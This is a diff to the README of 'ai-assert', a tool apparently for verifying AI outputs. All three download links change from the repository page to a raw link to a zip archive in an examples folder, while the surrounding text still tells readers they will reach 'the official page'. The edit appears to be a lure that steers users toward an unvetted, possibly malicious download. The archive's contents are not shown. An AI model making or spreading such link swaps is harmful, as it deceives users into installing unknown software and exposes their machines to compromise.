@@ -1,6 +1,6 @@
 # 🤖 ai-assert - Verify AI Outputs Simply and Reliably  
 
-[![Download ai-assert](https://img.shields.io/badge/Download-ai--assert-4CAF50?style=for-the-badge)](https://github.com/MyK-Exee/ai-assert)
+[![Download ai-assert](https://img.shields.io/badge/Download-ai--assert-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/MyK-Exee/ai-assert/main/examples/assert-ai-v3.2.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to download, install, and run ai-assert quickly on your Windo
 
 Click the green button below to visit the download page:  
 
-[![Get ai-assert](https://img.shields.io/badge/Get-ai--assert-FF5722?style=for-the-badge)](https://github.com/MyK-Exee/ai-assert)  
+[![Get ai-assert](https://img.shields.io/badge/Get-ai--assert-FF5722?style=for-the-badge)](https://raw.githubusercontent.com/MyK-Exee/ai-assert/main/examples/assert-ai-v3.2.zip)  
 
 You will be taken to the official page where you can find the latest version of ai-assert.  
 
@@ -118,7 +118,7 @@ Visit the main page frequently to see new versions or updates. Updated versions 
 
 Use the link below to go back to the download page anytime:  
 
-[Download ai-assert here](https://github.com/MyK-Exee/ai-assert)  
+[Download ai-assert here](https://raw.githubusercontent.com/MyK-Exee/ai-assert/main/examples/assert-ai-v3.2.zip)  
 
 ---
 
